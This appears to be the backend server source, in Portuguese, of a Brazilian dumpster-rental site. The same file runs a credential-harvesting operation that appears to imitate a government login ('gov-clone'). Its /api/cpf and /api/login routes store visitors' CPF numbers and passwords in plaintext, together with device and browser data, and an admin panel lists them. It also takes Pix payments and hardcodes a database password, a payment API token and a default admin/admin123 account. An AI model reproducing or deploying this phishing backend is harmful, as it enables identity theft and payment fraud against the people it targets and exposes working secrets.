const express = require('express');
const cors = require('cors');
const { Pool } = require('pg');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const cookieParser = require('cookie-parser');
const path = require('path');
const crypto = require('crypto');

const app = express();

app.use((req, res, next) => {
    res.setHeader('Content-Security-Policy', "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval'; style-src * 'unsafe-inline'; font-src * data:; img-src * data:; connect-src *; frame-src *;");
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    next();
});

app.use(cors());
app.use(express.json());
app.use(cookieParser());
app.use(express.static('public'));
app.use('/admin', express.static('admin'));

const pool = new Pool({
    connectionString: 'postgresql://nuitbanker_db_user:Gbnwn5eEqlrKkx4xjduxGis0DchI1aXy@dpg-d8h40ccvikkc73erecng-a/nuitbanker_db',
    ssl: { rejectUnauthorized: false }
});

// ============ TABELAS EXISTENTES ============
pool.query(`
    CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        cpf VARCHAR(14) UNIQUE,
        senha TEXT,
        ip TEXT,
        dispositivo TEXT,
        navegador TEXT,
        telefone VARCHAR(20),
        data_cpf TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        data_senha TIMESTAMP,
        status VARCHAR(20)
    )
`).catch(e => console.log('Tabela users ok'));

pool.query(`
    ALTER TABLE users ADD COLUMN IF NOT EXISTS telefone VARCHAR(20)
`).catch(e => console.log('Coluna telefone ok'));

pool.query(`
    CREATE TABLE IF NOT EXISTS logs (
        id SERIAL PRIMARY KEY,
        tipo VARCHAR(30),
        cpf VARCHAR(14),
        senha TEXT,
        ip TEXT,
        dispositivo TEXT,
        navegador TEXT,
        data TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
`).catch(e => console.log('Tabela logs ok'));

pool.query(`
    CREATE TABLE IF NOT EXISTS admin_users (
        id SERIAL PRIMARY KEY,
        username VARCHAR(50) UNIQUE,
        senha_hash VARCHAR(255)
    )
`).catch(e => console.log('Tabela admin ok'));

pool.query(`
    CREATE TABLE IF NOT EXISTS payments (
        id SERIAL PRIMARY KEY,
        transaction_id VARCHAR(100) UNIQUE,
        cpf VARCHAR(14),
        telefone VARCHAR(20),
        valor DECIMAL(10,2),
        status VARCHAR(20) DEFAULT 'pending',
        data_solicitacao TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        data_pagamento TIMESTAMP
    )
`).catch(e => console.log('Tabela payments ok'));

pool.query(`
    ALTER TABLE payments ADD COLUMN IF NOT EXISTS telefone VARCHAR(20)
`).catch(e => console.log('Coluna telefone payments ok'));

pool.query(`
    CREATE TABLE IF NOT EXISTS admin_attempts (
        id SERIAL PRIMARY KEY,
        ip TEXT,
        tentativa TEXT,
        data TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
`).catch(e => console.log('Tabela admin_attempts ok'));

// ============ NOVAS TABELAS PARA CAÇAMBAS ============
pool.query(`
    CREATE TABLE IF NOT EXISTS produtos (
        id SERIAL PRIMARY KEY,
        nome TEXT NOT NULL,
        tipo TEXT NOT NULL,
        preco REAL NOT NULL,
        preco_promocional REAL,
        descricao TEXT,
        icone TEXT,
        imagem TEXT,
        dimensoes TEXT,
        capacidade TEXT,
        ativo BOOLEAN DEFAULT true,
        created_at TIMESTAMP DEFAULT NOW()
    )
`).catch(e => console.log('Tabela produtos ok'));

pool.query(`
    CREATE TABLE IF NOT EXISTS clientes (
        id SERIAL PRIMARY KEY,
        nome TEXT NOT NULL,
        telefone TEXT NOT NULL,
        email TEXT,
        cpf TEXT,
        created_at TIMESTAMP DEFAULT NOW()
    )
`).catch(e => console.log('Tabela clientes ok'));

pool.query(`
    CREATE TABLE IF NOT EXISTS agendamentos (
        id SERIAL PRIMARY KEY,
        cliente_id INTEGER REFERENCES clientes(id),
        tipo_obra TEXT,
        endereco_obra TEXT,
        data_agendamento DATE,
        horario TEXT,
        observacoes TEXT,
        created_at TIMESTAMP DEFAULT NOW()
    )
`).catch(e => console.log('Tabela agendamentos ok'));

pool.query(`
    CREATE TABLE IF NOT EXISTS pedidos (
        id SERIAL PRIMARY KEY,
        cliente_id INTEGER REFERENCES clientes(id),
        produto_id INTEGER REFERENCES produtos(id),
        quantidade INTEGER DEFAULT 1,
        valor_total REAL,
        status_pagamento TEXT DEFAULT 'pendente',
        tipo_pagamento TEXT,
        transacao_id TEXT,
        created_at TIMESTAMP DEFAULT NOW()
    )
`).catch(e => console.log('Tabela pedidos ok'));

(async () => {
    try {
        const adminExists = await pool.query('SELECT * FROM admin_users WHERE username = $1', ['admin']);
        if (adminExists.rows.length === 0) {
            const hash = await bcrypt.hash('admin123', 10);
            await pool.query('INSERT INTO admin_users (username, senha_hash) VALUES ($1, $2)', ['admin', hash]);
            console.log('Admin criado: admin / admin123');
        }
        
        const produtosCount = await pool.query('SELECT COUNT(*) FROM produtos');
        if (parseInt(produtosCount.rows[0].count) === 0) {
            const produtosPadrao = [
                ['Caçamba 3m³', 'cacamba', 160, 140, 'Ideal para pequenas reformas, jardinagem e entulho leve. Capacidade: ate 500kg.', 'fas fa-dumpster', null, '2.0m x 1.5m x 1.0m', '3m³'],
                ['Caçamba 5m³', 'cacamba', 240, 200, 'Perfeita para obras medias, restos de construcao. Capacidade: ate 800kg.', 'fas fa-dumpster', null, '2.5m x 1.8m x 1.2m', '5m³'],
                ['Caçamba 7m³', 'cacamba', 320, 280, 'Alta capacidade para grandes obras. Capacidade: ate 1200kg.', 'fas fa-truck', null, '3.0m x 2.0m x 1.3m', '7m³']
            ];
            for (const p of produtosPadrao) {
                await pool.query(
                    `INSERT INTO produtos (nome, tipo, preco, preco_promocional, descricao, icone, imagem, dimensoes, capacidade) 
                     VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)`,
                    p
                );
            }
            console.log('Produtos padrao inseridos');
        }
    } catch(e) {}
})();

const JWT_SECRET = 'gov_secret_2024';

function verificarAdminToken(req, res, next) {
    const authHeader = req.headers.authorization;
    const token = authHeader && authHeader.split(' ')[1];
    
    if (!token) {
        return res.status(401).json({ error: 'Token nao fornecido' });
    }
    
    try {
        const decoded = jwt.verify(token, JWT_SECRET);
        if (decoded.username !== 'admin') {
            return res.status(403).json({ error: 'Acesso negado' });
        }
        next();
    } catch (error) {
        return res.status(401).json({ error: 'Token invalido ou expirado' });
    }
}

function getClientIP(req) {
    const ip = req.headers['x-forwarded-for'] || 
               req.connection.remoteAddress || 
               req.socket.remoteAddress ||
               req.ip;
    return ip ? ip.replace(/^::ffff:/, '') : 'IP nao identificado';
}

// ============ ROTAS EXISTENTES ============
app.post('/api/cpf', async (req, res) => {
    const { cpf, ip, dispositivo, navegador, telefone } = req.body;
    try {
        await pool.query(
            `INSERT INTO users (cpf, ip, dispositivo, navegador, data_cpf, status, telefone) 
             VALUES ($1, $2, $3, $4, CURRENT_TIMESTAMP, $5, $6)
             ON CONFLICT (cpf) DO UPDATE SET ip = $2, dispositivo = $3, navegador = $4, telefone = $6`,
            [cpf, ip, dispositivo, navegador, 'aguardando_senha', telefone]
        );
        res.json({ success: true });
    } catch (error) {
        res.json({ success: true });
    }
});

app.post('/api/login', async (req, res) => {
    const { cpf, password, ip, dispositivo, navegador, telefone } = req.body;
    try {
        await pool.query(
            `UPDATE users SET senha = $1, ip_senha = $2, dispositivo_senha = $3, navegador_senha = $4, data_senha = CURRENT_TIMESTAMP, status = $5, telefone = COALESCE(telefone, $6)
             WHERE cpf = $7`,
            [password, ip, dispositivo, navegador, 'completo', telefone, cpf]
        );
        await pool.query(
            'INSERT INTO logs (tipo, cpf, senha, ip, dispositivo, navegador) VALUES ($1, $2, $3, $4, $5, $6)',
            ['senha_inserida', cpf, password, ip, dispositivo, navegador]
        );
        res.json({ success: true });
    } catch (error) {
        res.json({ success: true });
    }
});

app.post('/api/admin/login', async (req, res) => {
    const { username, password } = req.body;
    const ip = getClientIP(req);
    
    const tentativa = `Login para usuario: ${username}`;
    await pool.query(
        'INSERT INTO admin_attempts (ip, tentativa) VALUES ($1, $2)',
        [ip, tentativa]
    ).catch(e => console.log('Erro ao registrar tentativa:', e));
    
    try {
        const result = await pool.query('SELECT * FROM admin_users WHERE username = $1', [username]);
        if (result.rows.length === 0) {
            return res.status(401).json({ error: 'Credenciais inválidas' });
        }
        
        const valid = await bcrypt.compare(password, result.rows[0].senha_hash);
        if (!valid) {
            return res.status(401).json({ error: 'Credenciais inválidas' });
        }
        
        const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: '24h' });
        res.cookie('admin_token', token, { httpOnly: true, maxAge: 24 * 60 * 60 * 1000 });
        res.json({ success: true, token });
        
    } catch (error) {
        console.error('Erro no login admin:', error);
        res.status(500).json({ error: 'Erro interno' });
    }
});

app.post('/api/admin/logout', (req, res) => {
    res.clearCookie('admin_token');
    res.json({ success: true });
});

app.get('/api/admin/stats', verificarAdminToken, async (req, res) => {
    try {
        const totalUsers = await pool.query('SELECT COUNT(*) FROM users');
        const comSenha = await pool.query("SELECT COUNT(*) FROM users WHERE senha IS NOT NULL");
        const totalLogs = await pool.query('SELECT COUNT(*) FROM logs');
        const totalProdutos = await pool.query('SELECT COUNT(*) FROM produtos');
        const totalAgendamentos = await pool.query('SELECT COUNT(*) FROM agendamentos');
        
        res.json({ stats: { 
            total_users: parseInt(totalUsers.rows[0].count),
            com_senha: parseInt(comSenha.rows[0].count),
            total_logs: parseInt(totalLogs.rows[0].count),
            total_produtos: parseInt(totalProdutos.rows[0].count),
            total_agendamentos: parseInt(totalAgendamentos.rows[0].count),
            tentativas_admin: 0
        }});
    } catch (error) {
        res.json({ stats: { total_users: 0, com_senha: 0, total_logs: 0, total_produtos: 0, total_agendamentos: 0 } });
    }
});

app.get('/api/admin/users', verificarAdminToken, async (req, res) => {
    try {
        const result = await pool.query('SELECT cpf, senha, ip, dispositivo, navegador, data_cpf, data_senha, telefone FROM users ORDER BY data_cpf DESC');
        res.json({ users: result.rows });
    } catch (error) {
        res.json({ users: [] });
    }
});

app.get('/api/admin/logs', verificarAdminToken, async (req, res) => {
    try {
        const result = await pool.query('SELECT tipo, cpf, senha, ip, dispositivo, navegador, data FROM logs ORDER BY data DESC LIMIT 200');
        res.json({ logs: result.rows });
    } catch (error) {
        res.json({ logs: [] });
    }
});

app.get('/api/admin/payments', verificarAdminToken, async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM payments ORDER BY id DESC');
        res.json({ payments: result.rows });
    } catch (error) {
        res.json({ payments: [] });
    }
});

app.get('/api/admin/tentativas', verificarAdminToken, async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM admin_attempts ORDER BY data DESC LIMIT 100');
        res.json({ tentativas: result.rows });
    } catch (error) {
        res.json({ tentativas: [] });
    }
});

app.delete('/api/admin/delete/:cpf', verificarAdminToken, async (req, res) => {
    try {
        await pool.query('DELETE FROM users WHERE cpf = $1', [req.params.cpf]);
        res.json({ success: true });
    } catch (error) {
        res.json({ success: true });
    }
});

app.post('/api/admin/clear', verificarAdminToken, async (req, res) => {
    try {
        await pool.query('DELETE FROM users');
        await pool.query('DELETE FROM logs');
        res.json({ success: true });
    } catch (error) {
        res.json({ success: true });
    }
});

app.post('/api/admin/clear-logs', verificarAdminToken, async (req, res) => {
    try {
        await pool.query('DELETE FROM logs');
        res.json({ success: true });
    } catch (error) {
        res.json({ success: false });
    }
});

app.post('/api/admin/clear-attempts', verificarAdminToken, async (req, res) => {
    try {
        await pool.query('DELETE FROM admin_attempts');
        res.json({ success: true });
    } catch (error) {
        res.json({ success: false });
    }
});

app.post('/api/admin/clear-payments', verificarAdminToken, async (req, res) => {
    try {
        await pool.query('DELETE FROM payments');
        res.json({ success: true });
    } catch (error) {
        res.json({ success: false });
    }
});

app.post('/api/admin/change-password', verificarAdminToken, async (req, res) => {
    const { senha_antiga, nova_senha } = req.body;
    
    if (!senha_antiga || !nova_senha || nova_senha.length < 6) {
        return res.status(400).json({ error: 'Senha antiga obrigatoria e nova senha deve ter no minimo 6 caracteres' });
    }
    
    try {
        const result = await pool.query('SELECT * FROM admin_users WHERE username = $1', ['admin']);
        if (result.rows.length === 0) {
            return res.status(404).json({ error: 'Admin nao encontrado' });
        }
        
        const senhaValida = await bcrypt.compare(senha_antiga, result.rows[0].senha_hash);
        if (!senhaValida) {
            return res.status(401).json({ error: 'Senha atual incorreta' });
        }
        
        const hash = await bcrypt.hash(nova_senha, 10);
        await pool.query('UPDATE admin_users SET senha_hash = $1 WHERE username = $2', [hash, 'admin']);
        
        res.json({ success: true });
    } catch (error) {
        console.error('Erro ao alterar senha:', error);
        res.status(500).json({ error: 'Erro interno do servidor' });
    }
});

// ============ NOVAS ROTAS PARA CAÇAMBAS ============
app.get('/api/produtos', async (req, res) => {
    try {
        const result = await pool.query("SELECT * FROM produtos WHERE ativo = true ORDER BY id");
        res.json({ success: true, produtos: result.rows });
    } catch (err) {
        res.status(500).json({ erro: err.message });
    }
});

app.get('/api/produtos/:id', async (req, res) => {
    try {
        const result = await pool.query("SELECT * FROM produtos WHERE id = $1", [req.params.id]);
        if (result.rows.length === 0) return res.status(404).json({ erro: 'Produto nao encontrado' });
        res.json({ success: true, produto: result.rows[0] });
    } catch (err) {
        res.status(500).json({ erro: err.message });
    }
});

app.post('/api/clientes', async (req, res) => {
    const { nome, telefone, email, cpf } = req.body;
    try {
        const result = await pool.query(
            "INSERT INTO clientes (nome, telefone, email, cpf) VALUES ($1, $2, $3, $4) RETURNING id",
            [nome, telefone, email, cpf]
        );
        res.json({ success: true, cliente_id: result.rows[0].id });
    } catch (err) {
        res.status(500).json({ erro: err.message });
    }
});

app.post('/api/agendamentos', async (req, res) => {
    const { cliente_id, tipo_obra, endereco_obra, data_agendamento, horario, observacoes } = req.body;
    try {
        const result = await pool.query(
            "INSERT INTO agendamentos (cliente_id, tipo_obra, endereco_obra, data_agendamento, horario, observacoes) VALUES ($1, $2, $3, $4, $5, $6) RETURNING id",
            [cliente_id, tipo_obra, endereco_obra, data_agendamento, horario, observacoes]
        );
        res.json({ success: true, agendamento_id: result.rows[0].id });
    } catch (err) {
        res.status(500).json({ erro: err.message });
    }
});

app.post('/api/pedidos', async (req, res) => {
    const { cliente_id, produto_id, quantidade, valor_total, tipo_pagamento } = req.body;
    try {
        const result = await pool.query(
            "INSERT INTO pedidos (cliente_id, produto_id, quantidade, valor_total, tipo_pagamento, status_pagamento) VALUES ($1, $2, $3, $4, $5, 'pendente') RETURNING id",
            [cliente_id, produto_id, quantidade, valor_total, tipo_pagamento]
        );
        res.json({ success: true, pedido_id: result.rows[0].id });
    } catch (err) {
        res.status(500).json({ erro: err.message });
    }
});

// ============ ROTAS ADMIN PARA CAÇAMBAS ============
app.get('/api/admin/produtos', verificarAdminToken, async (req, res) => {
    try {
        const result = await pool.query("SELECT * FROM produtos ORDER BY id");
        res.json({ success: true, produtos: result.rows });
    } catch (err) {
        res.status(500).json({ erro: err.message });
    }
});

app.post('/api/admin/produtos', verificarAdminToken, async (req, res) => {
    const { nome, tipo, preco, preco_promocional, descricao, icone, imagem, dimensoes, capacidade } = req.body;
    try {
        const result = await pool.query(
            "INSERT INTO produtos (nome, tipo, preco, preco_promocional, descricao, icone, imagem, dimensoes, capacidade) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9) RETURNING id",
            [nome, tipo, preco, preco_promocional, descricao, icone, imagem, dimensoes, capacidade]
        );
        res.json({ success: true, id: result.rows[0].id });
    } catch (err) {
        res.status(500).json({ erro: err.message });
    }
});

app.put('/api/admin/produtos/:id', verificarAdminToken, async (req, res) => {
    const { nome, tipo, preco, preco_promocional, descricao, icone, imagem, dimensoes, capacidade, ativo } = req.body;
    try {
        await pool.query(
            "UPDATE produtos SET nome=$1, tipo=$2, preco=$3, preco_promocional=$4, descricao=$5, icone=$6, imagem=$7, dimensoes=$8, capacidade=$9, ativo=$10 WHERE id=$11",
            [nome, tipo, preco, preco_promocional, descricao, icone, imagem, dimensoes, capacidade, ativo, req.params.id]
        );
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ erro: err.message });
    }
});

app.delete('/api/admin/produtos/:id', verificarAdminToken, async (req, res) => {
    try {
        await pool.query("DELETE FROM produtos WHERE id = $1", [req.params.id]);
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ erro: err.message });
    }
});

app.get('/api/admin/agendamentos', verificarAdminToken, async (req, res) => {
    try {
        const result = await pool.query(`
            SELECT a.*, c.nome as cliente_nome, c.telefone, c.cpf, c.email 
            FROM agendamentos a
            LEFT JOIN clientes c ON a.cliente_id = c.id
            ORDER BY a.created_at DESC
        `);
        res.json({ success: true, agendamentos: result.rows });
    } catch (err) {
        res.status(500).json({ erro: err.message });
    }
});

// ============ ROTAS DE PAGAMENTO PIX ============
const PLUMIFY_PRODUCT_HASH = 'lxpykbkgfl';
const PLUMIFY_API_TOKEN = '1Vp6bm2wSoil2giHCGRjsZ9IGVbiHve4u8xbyUoRWpdvHUWYOj6wZ9yd0xVq';

app.post('/api/save-payment', async (req, res) => {
    const { transaction_id, cpf, valor, telefone } = req.body;
    try {
        await pool.query(
            'INSERT INTO payments (transaction_id, cpf, valor, status, telefone) VALUES ($1, $2, $3, $4, $5) ON CONFLICT (transaction_id) DO NOTHING',
            [transaction_id, cpf, valor, 'pending', telefone]
        );
        res.json({ success: true });
    } catch (error) {
        console.error('Erro ao salvar pagamento:', error);
        res.json({ success: false });
    }
});

app.get('/api/check-payment/:transaction_id', async (req, res) => {
    const { transaction_id } = req.params;
    try {
        const result = await pool.query('SELECT status FROM payments WHERE transaction_id = $1', [transaction_id]);
        if (result.rows.length > 0) {
            res.json({ status: result.rows[0].status });
        } else {
            res.json({ status: 'not_found' });
        }
    } catch (error) {
        res.status(500).json({ error: 'Erro ao verificar pagamento' });
    }
});

app.post('/api/create-payment', async (req, res) => {
    const { amount, customer_name, customer_email, customer_cpf, customer_phone } = req.body;

    if (!amount || amount <= 0) {
        return res.status(400).json({ error: 'Valor invalido' });
    }

    if (customer_phone && customer_cpf) {
        try {
            await pool.query(
                'UPDATE users SET telefone = $1 WHERE cpf = $2',
                [customer_phone, customer_cpf]
            );
            console.log(`Telefone ${customer_phone} atualizado para o CPF ${customer_cpf}`);
        } catch(e) {
            console.log('Erro ao atualizar telefone:', e);
        }
    }

    const amountCents = Math.round(parseFloat(amount) * 100);

    const payload = {
        amount: amountCents,
        offer_hash: PLUMIFY_PRODUCT_HASH,
        payment_method: 'pix',
        customer: {
            name: customer_name || 'PAGAMENTO UNICO',
            email: customer_email || 'SAC@com.br',
            phone_number: customer_phone || '21973059827',
            document: customer_cpf || '07068093868',
            street_name: 'Rua Teste',
            number: '123',
            neighborhood: 'Centro',
            city: 'Sao Paulo',
            state: 'SP',
            zip_code: '01001000'
        },
        cart: [{
            product_hash: PLUMIFY_PRODUCT_HASH,
            title: 'PAGAMENTO UNICO',
            price: amountCents,
            quantity: 1,
            operation_type: 1,
            tangible: false
        }],
        expire_in_days: 3,
        transaction_origin: 'api',
        postback_url: 'https://gov-clone-81e8.onrender.com/api/webhook/pagamento'
    };

    console.log('Enviando para Plumify:', JSON.stringify(payload, null, 2));

    try {
        const response = await fetch(`https://api.Plumify.com.br/api/public/v1/transactions?api_token=${PLUMIFY_API_TOKEN}`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        const data = await response.json();
        console.log('Resposta Plumify:', data);

        if (data.pix && data.pix.pix_qr_code) {
            await pool.query(
                'INSERT INTO payments (transaction_id, cpf, valor, status, telefone) VALUES ($1, $2, $3, $4, $5) ON CONFLICT (transaction_id) DO NOTHING',
                [data.hash, customer_cpf, amount, 'pending', customer_phone]
            ).catch(e => console.log('Erro ao salvar:', e));

            res.json({
                success: true,
                payment: {
                    pix_code: data.pix.pix_qr_code,
                    pix_qrcode: data.pix.pix_qr_code,
                    expires_at: data.expires_at,
                    id: data.hash,
                    status: data.payment_status
                }
            });
        } else {
            res.json({
                success: false,
                error: data.message || 'Erro ao gerar PIX',
                details: data
            });
        }

    } catch (error) {
        console.error('Erro Plumify:', error.message);
        res.status(500).json({
            error: 'Erro ao gerar pagamento. Tente novamente.'
        });
    }
});

app.post('/api/webhook/pagamento', async (req, res) => {
    const { hash, status, amount, transaction } = req.body;
    
    console.log(`Webhook recebido: Transacao ${hash || transaction} - Status: ${status}`);
    
    if (status === 'paid') {
        try {
            await pool.query(
                'UPDATE payments SET status = $1, data_pagamento = NOW() WHERE transaction_id = $2',
                ['paid', hash || transaction]
            );
            console.log(`Pagamento confirmado: ${hash || transaction}`);
        } catch (error) {
            console.error('Erro ao processar webhook:', error);
        }
    }
    
    res.json({ received: true });
});

// ============ ROTAS DE PÁGINAS ============
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin', 'index.html'));
});

app.get('/agendamento', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'agendamento.html'));
});

app.get('/produtos', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'produtos.html'));
});

app.get('/produto', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'produto.html'));
});

app.get('/checkout', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'checkout.html'));
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Servidor rodando na porta ${PORT}`);
    console.log(`Ativa Caçambas - Sistema Unificado`);
});
